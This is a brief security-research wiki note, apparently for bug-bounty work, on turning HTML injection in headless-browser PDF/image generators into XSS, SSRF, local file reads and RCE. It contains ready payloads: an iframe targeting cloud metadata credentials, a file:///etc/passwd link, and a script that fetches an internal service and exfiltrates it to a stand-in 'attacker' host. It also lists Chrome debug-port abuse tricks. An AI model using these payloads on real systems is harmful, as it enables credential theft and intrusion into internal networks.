---
title: Headless-browser HTML injection → XSS / SSRF
slug: headless-browser-html-ssrf
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/ssrf, technique/dom-xss]
inbound: []
---

# Headless-browser HTML injection → XSS / SSRF

## Pattern
App renders user HTML in headless Chrome / wkhtmltopdf / Puppeteer (PDF
or PNG generator). Inject `<script>` → XSS in headless context. From
there:
- SSRF metadata via `<iframe src="http://169.254.169.254/...">` (see
  [[aws-imds-iframe-pdf]]).
- LFI via `<link href="file:///etc/passwd">` (NahamSec headless LFI talk
  2019).
- Read internal services via fetch to `127.0.0.1:internal-port`.
- Drop public Chromium V8 PoC for headless RCE — programs often accept
  "crashed browser" as crit even without weaponization.

## Preconditions
- Server-side HTML render to PDF/image.
- Attacker controls some HTML (template, profile, report builder).

## Detection
- Test `<h1>` first for visual feedback in PDF.
- Then `<iframe src=http://attacker/log>`.

## Triggering
```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
<link rel="stylesheet" href="file:///etc/passwd">
<script>fetch('http://127.0.0.1:9200/_cat/indices').then(r=>r.text()).then(t=>fetch('//attacker/?d='+btoa(t)))</script>
```

## Related primitives (Eps 9, 27)
- Slow-HTTP body stall to extend headless timeout: full headers +
  `Content-Length: 1`, never send body.
- `localhost:<remote-debug-port>/json/new?<url>` to spawn two tabs (opener
  relationship), bypassing popup limits.
- Chrome `localhost:9222/json` via SSRF in shared headless Chrome →
  enumerate other tabs.
- Multi-redirect-codes fuzz (301/302/303/307/308) — SSRF-followers
  inconsistent.
- Captive-portal jsforce on IoT devices.

## Seen in the wild
- HackerOne $25K analytics-PDF SSRF (Dec 2023) — see [[aws-imds-iframe-pdf]].
- Critical Thinking Podcast Eps 9, 27, 51.

## References
- NahamSec — headless browser LFI talk (2019)
- Jonathan Bowman — MPDF annotation file-include writeup
- Jack Halon — Chrome browser exploitation 3-part series
- Critical Thinking Podcast Eps 9, 27, 51
